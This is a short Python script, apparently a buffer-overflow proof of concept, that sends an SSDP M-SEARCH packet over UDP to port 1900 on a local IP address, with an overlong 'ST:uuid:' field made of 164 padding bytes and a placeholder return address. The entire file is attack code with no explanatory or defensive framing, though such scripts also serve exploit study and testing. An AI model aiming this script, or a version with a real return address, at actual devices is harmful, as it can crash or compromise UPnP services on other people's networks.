import socket

target_ip = "192.168.15.124" # IP Address of Target
off = "D"*164
ret_addr = "AAAA"

payload = off + ret_addr

packet = \
    'M-SEARCH * HTTP/1.1\r\n' \
    'HOST:239.255.255.250:1900\r\n' \
    'ST:uuid:'+payload+'\r\n' \
    'MX:2\r\n' \
    'MAN:"ssdp:discover"\r\n' \
    '\r\n'

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.sendto(packet.encode(), (target_ip, 1900) )